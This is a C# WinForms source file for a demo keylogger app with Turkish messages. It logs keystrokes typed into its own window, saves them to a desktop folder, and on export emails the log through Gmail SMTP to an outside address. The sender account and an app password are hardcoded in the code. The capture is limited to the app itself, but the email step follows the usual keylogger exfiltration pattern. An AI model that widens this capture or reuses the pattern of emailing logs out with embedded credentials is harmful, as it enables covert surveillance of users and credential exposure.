using System;
using System.IO;
using System.Windows.Forms;
using SafeKeyLoggerApp.Interfaces;
using SafeKeyLoggerApp.Loggers;
using SafeKeyLoggerApp.Storage;
using SafeKeyLoggerApp.Models;
using SafeKeyLoggerApp.Exporter;
using System.Net;
using System.Net.Mail;
using System.IO;


namespace SafeKeyLoggerApp
{
    public partial class MainForm : Form
    {
        private readonly IKeyLogger keyLogger;
        private readonly IStorage storage;
        private readonly SafeExporter exporter;

        public MainForm()
        {
            InitializeComponent();

            var desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            var baseDir = Path.Combine(desktop, "SafeKeyLoggerDemo");
            Directory.CreateDirectory(baseDir);
            var logPath = Path.Combine(baseDir, "log.txt");
            var outbox = Path.Combine(baseDir, "outbox");

            storage = new FileStorage(logPath);
            exporter = new SafeExporter(outbox);
            var appLogger = new AppFocusKeyLogger(storage);
            keyLogger = appLogger;
            keyLogger.OnLog += Entry => this.Invoke(() => textBoxLogs.AppendText($"{Entry.Timestamp:HH:mm:ss} {Entry.Description}\r\n"));

            // Wire Key events to AppFocusKeyLogger
            this.KeyDown += (s,e) =>
            {
                var mods = "";
                if (e.Control) mods += "Ctrl+";
                if (e.Alt) mods += "Alt+";
                if (e.Shift) mods += "Shift+";
                appLogger.AppendLocal($"Key: {mods}{e.KeyCode}");
            };
            this.KeyPress += (s,e) =>
            {
                appLogger.AppendLocal($"Char: '{e.KeyChar}'");
            };
        }

        private void SendLogsByEmail()
        {
            try
            {
                string logFilePath = Path.Combine(Application.StartupPath, "C:\\Users\\Asus-PC\\Desktop\\SafeKeyLoggerDemo\\log.txt");

                string fromAddress = "umutzaif124@gmail.com";
                string password = "deof ftrj yyrt mick";
                string toAddress = "uzaibilim@hotmail.com";

                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(fromAddress);
                mail.To.Add(toAddress);
                mail.Subject = "Uygulama Logları";
                mail.Body = "Merhaba Umut,\n\nSon log dosyası ektedir.";

                if (File.Exists(logFilePath))
                    mail.Attachments.Add(new Attachment(logFilePath));

                SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
                smtp.EnableSsl = true;
                smtp.Credentials = new NetworkCredential(fromAddress, password);
                smtp.Send(mail);

                MessageBox.Show("Loglar başarıyla gönderildi!");
            }
            catch (Exception ex)
            {
                MessageBox.Show("E-posta gönderimi başarısız: " + ex.Message);
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            keyLogger.Start();
            btnStart.Enabled = false;
            btnStop.Enabled = true;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            keyLogger.Stop();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }

        private void btnExport_Click(object sender, EventArgs e)
        {
            var exported = exporter.Export(storage.GetFilePath());
            MessageBox.Show($"Outbox'a kopyalandı:\n{exported}", "Exported", MessageBoxButtons.OK, MessageBoxIcon.Information);
            SendLogsByEmail();
        }
    }
}
